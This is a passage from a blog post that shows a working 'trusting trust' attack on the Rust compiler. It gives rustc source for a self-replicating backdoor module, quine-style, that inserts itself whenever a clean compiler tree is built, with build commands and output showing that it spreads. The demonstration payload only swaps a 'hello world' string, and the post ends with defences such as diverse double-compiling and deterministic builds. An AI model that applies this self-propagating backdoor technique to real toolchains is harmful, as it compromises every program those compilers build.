can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
don&rsquo;t actually want to backdoor the compiler.</p>

<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>

<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
with &ldquo;जगाला नमस्कार&rdquo;, a rough translation of the same in my native language.</p>

<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>

<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).</p>

<p>So I write the following <code>Folder</code>:</p>

<pre><code class="rust">// Understanding the minute details of this code isn't important; it is a bit complex
// since the API used here isn't meant to be used this way. Focus on the comments.

mod trust {
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    struct TrustFolder;

    // The trait contains default impls which we override for specific cases
    impl Folder for TrustFolder {
        // every time we come across an expression, run this function
        // on it and replace it with the produced expression in the tree
        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
            // The peculiar `.map` pattern needs to be used here
            // because of the way AST nodes are stored in immutable
            // `P&lt;T&gt;` pointers. The AST is not typically mutated.
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) =&gt; {
                        *l = l.clone().map(|mut l| {
                            // look for string literals
                            if let LitKind::Str(ref mut s, _) = l.node {
                                // replace their contents
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ =&gt; ()
                }
                // recurse down expression with the default fold
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mac(&amp;mut self, mac: Mac) -&gt; Mac {
            // Folders are not typically supposed to operate on pre-macro-expansion ASTs
            // and will by default panic here. We must explicitly specify otherwise.
            noop_fold_mac(mac, self)
        }
    }

    // our entry point
    pub fn fold_crate(krate: Crate) -&gt; Crate {
        // make a folder, fold the crate with it
        TrustFolder.fold_crate(krate)
    }
}
</code></pre>

<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>

<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>

<pre><code class="rust">// test.rs
fn main() {
    let x = "hello world";
    println!("{}", x);
}
</code></pre>

<pre><code class="sh">$ rustup run stage1 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.</p>

<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
<code>trust::fold_crate()</code> call).</p>

<p>We need to tweak our folder so that it does two things:</p>

<ul>
<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
<li>Inserts the <code>trust</code> module</li>
</ul>


<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
are within the same module, so the instructions for outputting <em>these</em> instructions need to be
included, and so on. This clearly isn&rsquo;t viable.</p>

<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like</p>

<pre><code class="rust">mod trust {
    static SELF_STRING: &amp;'static str = "/* stringified contents of this module except for this line */";
    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
</code></pre>

<p>With the code of the module entered in, this will look something like</p>

<pre><code class="rust">mod trust {
    static SELF_STRING: &amp;'static str = "
        // .. 
        fn fold_mod(..) {
            // ..
            // this produces a string that is the same as the code for the module containing it
            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
            // once to produce the code for the module
            let code_for_module = \"mod trust { static SELF_STRING: &amp;'static str = \\\"\" + SELF_STRING + \"\\\";\" + SELF_STRING + \"}\";
            insert_into_crate(code_for_module);
            // ..
        }
        // ..
    ";

    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
</code></pre>

<p>So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice &ndash; once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
the original AST!</p>

<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
works, without worrying about this cyclical quineyness:</p>

<pre><code class="rust">mod trust {
    // dummy string just to see if it gets injected
    // inserting the full code of this module has some practical concerns
    // about escaping which I'll address later
    static SELF_STRING: &amp;'static str = "use foo::bar::blah;";
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::parse_crate_from_source_str;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    use syntax::util::move_map::MoveMap;
    use rustc::session::Session;

    struct TrustFolder&lt;'a&gt; {
        // we need the session to be able to parse things. No biggie.
        sess: &amp;'a Session,
    }

    impl&lt;'a&gt; Folder for TrustFolder&lt;'a&gt; {
        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) =&gt; {
                        *l = l.clone().map(|mut l| {
                            if let LitKind::Str(ref mut s, _) = l.node {
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ =&gt; ()
                }
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
            // move_flat_map takes a vector, constructs a new one by operating
            // on each element by-move. Again, needed because of `P&lt;T&gt;`
            let new_items = m.items.move_flat_map(|item| {
                // we want to modify this function, and give it a sibling from SELF_STRING
                if item.ident.name.as_str() == "phase_2_configure_and_expand" {
                    // parse SELF_STRING
                    let new_crate = parse_crate_from_source_str("trust".into(),
                                                                SELF_STRING.into(),
                                                                &amp;self.sess.parse_sess).unwrap();
                    // extract the first item contained in it, which is the use statement
                    let inner_item = new_crate.module.items[0].clone();

                    // move_flat_map needs an iterator of items to insert
                    vec![inner_item, item].into_iter()
                } else {
                    vec![item].into_iter()
                }
            });
            let m = Mod {
                inner: m.inner,
                items: new_items,
            };
            noop_fold_mod(m, self)
        }
        fn fold_mac(&amp;mut self, _mac: Mac) -&gt; Mac {
            noop_fold_mac(_mac, self)
        }
    }

    pub fn fold_crate(krate: Crate, sess: &amp;Session) -&gt; Crate {
        let mut folder = TrustFolder {sess: sess};
        folder.fold_crate(krate)
    }
}
</code></pre>

<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>

<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>

<pre><code>rustc: x86_64-apple-darwin/stage1/lib/rustlib/x86_64-apple-darwin/lib/librustc_driver
error[E0432]: unresolved import `foo::bar::blah`
 --&gt; trust:1:5
  |
1 | use foo::bar::blah;
  |     ^^^^^^^^^^^^^^ Maybe a missing `extern crate foo;`?

error: aborting due to previous error
</code></pre>

<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
resolve, and thus got a failure when compiling the crate the second time around.</p>

<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>

<pre><code class="rust">fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
    let new_items = m.items.move_flat_map(|item| {
        // look for the phase_2_configure_and_expand function
        if item.ident.name.as_str() == "phase_2_configure_and_expand" {
            // construct the code for the module contents as described earlier
            let code_for_module = r###"mod trust { static SELF_STRING: &amp;'static str = r##"###.to_string() + r###"##""### + SELF_STRING + r###""##"### + r###"##;"### + SELF_STRING + "}";
            // Parse it into an AST by creating a crate only containing that code
            let new_crate = parse_crate_from_source_str("trust".into(),
                                                        code_for_module,
                                                        &amp;self.sess.parse_sess).unwrap();
            // extract the AST of the contained module
            let inner_mod = new_crate.module.items[0].clone();

            // now to insert the fold_crate() call
            let item = item.map(|mut i| {
                if let ItemKind::Fn(.., ref mut block) = i.node {
                    *block = block.clone().map(|mut b| {
                        // create a temporary crate just containing a fold_crate call
                        let new_crate = parse_crate_from_source_str("trust".into(),
                                                                    "fn trust() {let krate = trust::fold_crate(krate, sess);}".into(),
                                                                    &amp;self.sess.parse_sess).unwrap();
                        // extract the AST from the parsed temporary crate, shove it in here
                        if let ItemKind::Fn(.., ref blk) = new_crate.module.items[0].node {
                            b.stmts.insert(0, blk.stmts[0].clone());
                        }
                        b
                    });
                }
                i
            });
            // yield both the created module and the modified function to move_flat_map
            vec![inner_mod, item].into_iter()
        } else {
            vec![item].into_iter()
        }
    });
    let m = Mod {
        inner: m.inner,
        items: new_items,
    };
    noop_fold_mod(m, self)
}
</code></pre>

<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.</p>

<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>

<pre><code class="rust">let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
</code></pre>

<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.</p>

<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>

<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we&rsquo;re done.</p>

<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>

<pre><code class="sh">$ rustup run stage2 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>I was also able to make it work with a separate clone of Rust:</p>

<pre><code class="sh">$ cd /path/to/new/clone
# Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked
# from anywhere inside this folder.
$ rustup override set stage1 # Works with stage 2 as well.

# with --enable-local-rust, instead of the downloaded stage 0 compiler compiling
# stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we
# need to check out a git commit close to our changes. This commit is the parent of our changes,
# and is bound to work
$ git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1

# This will make it call `rustc` instead of downloading its own compiler.
# We already overrode rustc to be our backdoored compiler for this folder
# using rustup
$ ./configure --enable-local-rust
# build it!
$ make rustc-stage1
# Tell rustup about the new toolchain
$ rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
$ rustup run other-stage1 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>

<hr />

<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>

<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>

<p>A couple of things we could do are:</p>

<ul>
<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">&ldquo;Diverse Double-Compiling&rdquo;</a> wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
</ul>


<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
shouldn&rsquo;t need to change.</p>

<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
about.</p>

<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
</feed>
